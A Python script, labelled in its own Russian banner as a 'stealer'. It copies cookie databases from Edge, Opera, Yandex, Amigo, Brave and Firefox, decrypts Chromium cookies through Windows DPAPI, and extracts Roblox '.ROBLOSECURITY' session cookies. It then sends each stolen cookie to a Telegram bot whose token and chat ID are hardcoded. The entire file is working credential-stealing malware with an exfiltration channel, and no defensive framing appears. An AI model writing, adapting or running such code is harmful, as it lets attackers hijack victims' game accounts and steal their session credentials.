# Конфигурация
import os
import sqlite3
import json
import requests
import base64
from shutil import copy2
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import win32crypt  # Для расшифровки ключей Windows

# Конфиг Telegram
TELEGRAM_TOKEN = "8081126269:AAH6WKbPLU0Vbg-pZWSSV9wE8d7Nr13pmmo"  # Замените на реальный токен бота
CHAT_ID = "1962231620"       # Замените на реальный Chat ID

def decrypt_cookie(cookie, key):
    try:
        iv = cookie[3:15]
        payload = cookie[15:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(payload)[:-16].decode()
    except:
        return None

def decrypt_key(encrypted_key):
    try:
        # Удалить префикс DPAPI и декодировать Base64
        encrypted_key = base64.b64decode(encrypted_key)[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def get_chromium_cookies(browser_path):
    cookies = []
    try:
        # Проверка существования путей
        cookies_path = os.path.join(browser_path, "Network", "Cookies")
        local_state_path = os.path.join(browser_path, "Local State")
        
        if not os.path.exists(cookies_path) or not os.path.exists(local_state_path):
            return []
        
        # Копирование файлов
        temp_cookie = os.path.join(os.getenv("TEMP"), f"temp_cookie_{os.getpid()}")
        temp_local_state = os.path.join(os.getenv("TEMP"), f"temp_local_state_{os.getpid()}")
        copy2(cookies_path, temp_cookie)
        copy2(local_state_path, temp_local_state)

        # Извлечение ключа
        with open(temp_local_state, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = local_state["os_crypt"]["encrypted_key"]
        key = decrypt_key(encrypted_key)
        if not key:
            return []

        # Поиск куки
        conn = sqlite3.connect(temp_cookie)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT name, encrypted_value 
            FROM cookies 
            WHERE host_key LIKE '%roblox.com' 
            AND name='.ROBLOSECURITY'
        """)
        
        for name, encrypted_val in cursor.fetchall():
            if encrypted_val[:3] == b'v10':  # Проверка версии шифрования
                decrypted = decrypt_cookie(encrypted_val, key)
                if decrypted: cookies.append(decrypted)
        
        conn.close()
        os.unlink(temp_cookie)
        os.unlink(temp_local_state)
    except Exception as e:
        pass
    return cookies

def get_firefox_cookies(profile_path):
    try:
        cookies_path = os.path.join(profile_path, "cookies.sqlite")
        if not os.path.exists(cookies_path):
            return []
        
        temp_db = os.path.join(os.getenv("TEMP"), f"temp_cookies_{os.getpid()}.sqlite")
        copy2(cookies_path, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("""
            SELECT value 
            FROM moz_cookies 
            WHERE host LIKE '%roblox.com' 
            AND name='.ROBLOSECURITY'
        """)
        cookies = [row[0] for row in cursor.fetchall()]
        conn.close()
        os.unlink(temp_db)
        return cookies
    except:
        return []

def send_to_telegram(cookie):
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        data = {"chat_id": CHAT_ID, "text": f"ROBLOSECURITY: {cookie}"}
        requests.post(url, data=data, timeout=10)
    except:
        pass

def main():
    browsers = {
        "Edge": os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default"),
        "Opera": os.path.join(os.getenv("APPDATA"), "Opera Software", "Opera Stable"),
        "Yandex": os.path.join(os.getenv("LOCALAPPDATA"), "Yandex", "YandexBrowser", "User Data", "Default"),
        "Amigo": os.path.join(os.getenv("LOCALAPPDATA"), "Amigo", "User Data", "Default"),
        "Brave": os.path.join(os.getenv("LOCALAPPDATA"), "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        "Firefox": os.path.join(os.getenv("APPDATA"), "Mozilla", "Firefox", "Profiles")
    }

    found_cookies = set()
    for name, path in browsers.items():
        if name == "Firefox":
            if os.path.exists(path):
                for profile in os.listdir(path):
                    profile_path = os.path.join(path, profile)
                    if os.path.isdir(profile_path):
                        found_cookies.update(get_firefox_cookies(profile_path))
        elif os.path.exists(path):
            found_cookies.update(get_chromium_cookies(path))

    for cookie in found_cookies:
        send_to_telegram(cookie)

if __name__ == "__main__":
    print("===== Запуск стиллера =====")
    main()
    print("Операция завершена")
    input()
